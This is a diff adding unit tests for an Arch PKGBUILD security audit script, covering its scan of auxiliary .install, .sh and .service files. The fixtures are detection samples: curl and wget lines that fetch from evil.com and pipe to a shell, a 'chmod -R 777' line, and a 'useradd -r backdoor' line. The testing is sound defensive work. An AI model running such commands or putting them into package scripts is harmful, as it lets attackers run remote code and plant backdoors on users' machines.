@@ -3,6 +3,9 @@ PKGBUILD 安全审计脚本测试
 """
 
 import importlib.util
+import os
+import shutil
+import tempfile
 import unittest
 from pathlib import Path
 from unittest import mock
@@ -197,6 +200,98 @@ class GlobToRegexTests(unittest.TestCase):
         regex = self.module._glob_to_regex('https://example.com/path/file.tar.gz')
         self.assertTrue(self.module.re.search(regex, 'https://example.com/path/file.tar.gz'))
         self.assertFalse(self.module.re.search(regex, 'https://example.com/pathXfile.tar.gz'))
+
+
+class AuxFileTests(unittest.TestCase):
+    """辅助脚本/配置文件（.install/.sh/.service 等）审计测试"""
+
+    def setUp(self):
+        self.module = load_module('audit_pkgbuild_under_test')
+        self.tmpdir = tempfile.mkdtemp(prefix='aux-audit-test-')
+
+    def tearDown(self):
+        shutil.rmtree(self.tmpdir, ignore_errors=True)
+
+    def test_find_aux_files_collects_scripts(self):
+        root = Path(self.tmpdir)
+        (root / 'pkg.install').write_text('post_install() { :; }')
+        (root / 'launcher.sh').write_text('#!/bin/bash\necho hi')
+        (root / 'app.desktop').write_text('[Desktop Entry]\nExec=app')
+        (root / 'patch.mjs').write_text('console.log(1)')
+        (root / 'helper.py').write_text('print(1)')
+        (root / 'README.md').write_text('docs')
+        aux = self.module.find_aux_files(self.tmpdir)
+        self.assertEqual(
+            sorted(aux.keys()),
+            ['app.desktop', 'helper.py', 'launcher.sh', 'patch.mjs', 'pkg.install'],
+        )
+
+    def test_find_aux_files_skips_binary_and_vendor_dirs(self):
+        root = Path(self.tmpdir)
+        (root / 'node_modules').mkdir()
+        (root / 'node_modules' / 'lib.js').write_text('eval()')
+        (root / 'blob.install').write_bytes(b'\x00\x01\x02')
+        aux = self.module.find_aux_files(self.tmpdir)
+        self.assertEqual(aux, {})
+
+    def test_run_aux_file_checks_detects_curl_pipe_shell(self):
+        aux = {'pkg.install': 'post_install() { curl https://evil.com/x | bash }'}
+        issues = self.module.run_aux_file_checks(aux)
+        self.assertTrue(any(
+            sev == 'CRITICAL' and rid == 'curl-pipe-shell' and 'pkg.install' in desc
+            for sev, rid, desc in issues
+        ))
+
+    def test_run_aux_file_checks_detects_wget_pipe_sh(self):
+        aux = {'launcher.sh': 'wget https://evil.com/x -O - | sh'}
+        issues = self.module.run_aux_file_checks(aux)
+        self.assertTrue(any(
+            sev == 'CRITICAL' and rid == 'wget-pipe-shell' and 'launcher.sh' in desc
+            for sev, rid, desc in issues
+        ))
+
+    def test_run_aux_file_checks_detects_chmod_777(self):
+        aux = {'app.service': '[Service]\nExecStartPre=chmod -R 777 /usr/lib/app'}
+        issues = self.module.run_aux_file_checks(aux)
+        self.assertTrue(any(
+            sev == 'CRITICAL' and rid == 'chmod-world-writable' and 'app.service' in desc
+            for sev, rid, desc in issues
+        ))
+
+    def test_run_aux_file_checks_detects_system_user_creation(self):
+        aux = {'pkg.install': 'post_install() { useradd -r backdoor }'}
+        issues = self.module.run_aux_file_checks(aux)
+        self.assertTrue(any(
+            sev == 'ERROR' and rid == 'create-system-user' and 'pkg.install' in desc
+            for sev, rid, desc in issues
+        ))
+
+    def test_run_aux_file_checks_clean_files_pass(self):
+        aux = {
+            'pkg.install': 'post_install() { chmod 755 /usr/lib/app }',
+            'launcher.sh': '#!/bin/bash\nexec /usr/bin/app "$@"',
+            'app.desktop': '[Desktop Entry]\nExec=app %U',
+        }
+        issues = self.module.run_aux_file_checks(aux)
+        self.assertEqual(issues, [])
+
+    def test_main_integration_aux_file_blocks_build(self):
+        root = Path(self.tmpdir)
+        (root / 'PKGBUILD').write_text(
+            'pkgname=test\nsource=()\npackage() { :; }'
+        )
+        (root / 'test.install').write_text(
+            'post_install() { wget https://evil.com/x -O - | sh }'
+        )
+        env = {
+            'SOURCE_URL': 'https://aur.archlinux.org/example.git',
+            'PACKAGE_NAME': 'test',
+            'SOURCE_DIR': self.tmpdir,
+        }
+        with mock.patch.dict(os.environ, env, clear=False):
+            with self.assertRaises(SystemExit) as cm:
+                self.module.main()
+        self.assertEqual(cm.exception.code, 1)
 
 
 class ExtractPatchAdditionsTests(unittest.TestCase):
